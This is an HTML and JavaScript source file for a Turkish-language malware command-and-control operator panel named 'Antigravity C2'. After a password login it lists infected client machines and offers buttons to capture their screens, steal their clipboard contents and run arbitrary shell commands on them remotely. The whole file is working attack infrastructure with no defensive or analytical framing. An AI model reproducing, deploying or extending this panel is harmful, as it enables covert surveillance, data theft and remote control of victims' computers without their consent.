<!DOCTYPE html>
<html lang="tr">

<head>
    <meta charset="UTF-8">
    <title>Antigravity C2 Secure Panel</title>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background: #0b0e14;
            color: #adbac7;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 90%;
            max-width: 1100px;
            background: #161b22;
            padding: 30px;
            border-radius: 16px;
            border: 1px solid #30363d;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }

        #login-screen {
            text-align: center;
        }

        #main-content {
            display: none;
        }

        input {
            background: #0d1117;
            border: 1px solid #30363d;
            color: white;
            padding: 12px;
            border-radius: 8px;
            margin: 10px 0;
            width: 250px;
        }

        button {
            background: #316dca;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            margin: 5px;
            transition: 0.2s;
        }

        button:hover {
            background: #448cf2;
        }

        .client-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            border-bottom: 1px solid #30363d;
        }

        .status-online {
            color: #57ab5a;
        }

        .status-offline {
            color: #f47067;
        }

        .badge {
            background: #2d333b;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 0.8em;
        }
    </style>
</head>

<body>
    <!-- LOGIN SCREEN -->
    <div id="login-screen" class="container" style="max-width: 400px;">
        <h2>🛡️ Secure Login</h2>
        <input type="password" id="panel-pass" placeholder="Panel Şifresi">
        <br>
        <button onclick="doLogin()">Giriş Yap</button>
    </div>

    <!-- MAIN DASHBOARD -->
    <div id="main-content" class="container">
        <div
            style="display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #30363d; padding-bottom: 15px; margin-bottom: 20px;">
            <h1 style="color: #539bf5; margin:0;">🛰️ Operator Terminal</h1>
            <button onclick="location.reload()" style="background:#2d333b">Çıkış</button>
        </div>
        <div id="client-list"></div>
    </div>

    <script>
        let sessionToken = "";

        async function doLogin() {
            const pass = document.getElementById('panel-pass').value;
            const resp = await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: pass })
            });
            if (resp.ok) {
                const data = await resp.json();
                sessionToken = data.token;
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
                fetchClients();
                setInterval(fetchClients, 5000);
            } else {
                alert("Erişim Reddedildi!");
            }
        }

        async function fetchClients() {
            const resp = await fetch('/api/clients');
            const clients = await resp.json();
            const listDiv = document.getElementById('client-list');

            listDiv.innerHTML = clients.map(c => `
                <div class="client-row">
                    <div>
                        <b style="color:#539bf5; font-size:1.2em;">${c.id}</b> 
                        <span class="badge">${c.os}</span>
                        <div style="font-size:0.8em; margin-top:5px; opacity:0.6;">Son Görülme: ${c.last_seen_str}</div>
                    </div>
                    <div class="${c.status === 'online' ? 'status-online' : 'status-offline'}">
                        ● ${c.status.toUpperCase()}
                    </div>
                    <div>
                        <button onclick="sendCmd('${c.id}', 'GET_SS')">📸 Ekran</button>
                        <button onclick="sendCmd('${c.id}', 'GET_CLIP')">📋 Pano</button>
                        <button style="background:#be123c" onclick="sendShell('${c.id}')">🐚 Shell</button>
                    </div>
                </div>
            `).join('') || '<p style="text-align:center; opacity:0.5;">Bağlı cihaz yok...</p>';
        }

        async function sendCmd(id, cmd) {
            await fetch(`/api/command/${id}/${cmd}`, { method: 'POST' });
            alert("Komut sıraya alındı.");
        }

        async function sendShell(id) {
            const key = prompt("Shell Güvenlik Anahtarı:");
            if (!key) return;
            const shell = prompt("Çalıştırılacak Komut:");
            if (shell) {
                const resp = await fetch(`/api/command/${id}/SHELL:${shell}?key=${key}`, { method: 'POST' });
                if (resp.status === 403) alert("Hatalı Güvenlik Anahtarı!");
                else alert("Shell komutu gönderildi.");
            }
        }
    </script>
</body>

</html>
